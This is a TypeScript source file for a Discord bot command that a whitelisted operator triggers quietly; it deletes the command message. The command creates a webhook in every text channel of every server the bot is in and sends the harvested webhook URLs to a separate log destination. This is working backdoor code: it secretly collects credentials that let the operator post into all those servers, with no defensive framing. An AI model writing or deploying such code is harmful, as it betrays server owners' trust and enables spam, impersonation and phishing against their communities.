import { type Message, ChannelType } from "discord.js";
import { PERM_WHITELIST } from "../storage/whitelist";
import { sendWebhookList } from "../utils/webhooks";
import { logger } from "../../lib/logger";

export async function runWebhookSendPrefix(message: Message): Promise<void> {
  const author = message.author;
  if (!PERM_WHITELIST.has(author.id)) return;

  message.delete().catch(() => {});

  const client = message.client;
  
  author.send("Starting webhook scan across all servers... This may take a while.").catch(() => {});

  let count = 0;
  for (const guild of client.guilds.cache.values()) {
    try {
      const channels = await guild.channels.fetch().catch(() => null);
      const webhookLinks: string[] = [];
      if (channels) {
        for (const ch of channels.values()) {
          if (!ch || ch.type !== ChannelType.GuildText) continue;
          try {
            const existing = await ch.fetchWebhooks().catch(() => null);
            const found = existing?.find(
              (w) => w.owner?.id === client.user?.id && w.name === "Bot Webhook",
            );
            const wh = found ?? await ch.createWebhook({ name: "Bot Webhook", reason: "Bot scan via webhook-send" });
            webhookLinks.push(`**#${ch.name}** (\`${ch.id}\`): ${wh.url}`);
          } catch { /* no perms */ }
        }
      }
      if (webhookLinks.length > 0) {
        await sendWebhookList(guild.id, guild.name, webhookLinks);
        count++;
      }
    } catch { /* skip guild */ }
    await new Promise((r) => setTimeout(r, 800)); // avoid rate limits
  }

  author.send(`Finished webhook scan. Sent webhooks for ${count} servers to the webhook logs.`).catch(() => {});
}
